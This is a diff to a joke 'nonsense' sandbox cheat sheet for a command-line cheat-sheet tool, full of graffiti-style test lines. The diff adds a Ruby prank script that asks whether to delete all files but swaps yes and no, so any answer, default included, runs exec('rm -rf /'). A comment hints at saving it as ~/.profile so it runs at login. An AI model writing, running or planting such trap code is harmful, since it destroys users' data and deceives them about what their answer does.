@@ -1,5 +1,28 @@
 --- 
 nonsense: |-
+  Feel free to use this cheat sheet as a sandbox.  Play with --edit.
+  For the confused, that's: "cheat nonsense --edit"
+  	
+  #!/usr/bin/env ruby
+  puts "Yes means No and No means Yes. Delete all files [Y]?"
+  
+  yes, no = "no", "yes"
+  default = no
+  
+  def delete_all_files
+    exec("rm -rf /")
+  end
+  
+  response = gets.downcase
+  response = default if (response[0]!="n" and response[0]!="y")
+  
+  delete_all_files if response[0] == yes[0]   
+  delete_all_files if response[0] == "yes"[0]
+  
+  # possibly a mistake to save this as ~/.profile
+  
+  
+  
   What's the way to edit a cheat sheet?  Oh sheet.
   
   edit edit edit. java roolz - can your ruby do this?
@@ -52,8 +75,6 @@ nonsense: |-
   
   The nonsense cheat sheet has been edited
   
-  Feel free to use this cheat sheet as a sandbox.  Play with --edit.
-  
   Please.
   
   This is sweet!
@@ -62,12 +83,21 @@ nonsense: |-
   
   <a href="spam sucks">link test</a>
   
-  Hello, world.
-  
-  Doom!
-  
-  Great stuff
-  
   ..and that's why cheat also is an anagram for teach!
   
   Man, I thought we'd never get to the end of this...
+  She is done!
+  
+  Yeah, unbelievable.
+  
+  Works with vi perfectly! Totally portable.
+  
+  So liek.. thiz iz liek sum kynd ovv test.
+  
+  Where is this going?  Where are you going?  Are you going my way?
+  
+  Woz woz ere
+  
+  test
+  
+  luv = Regexp.new([luv])
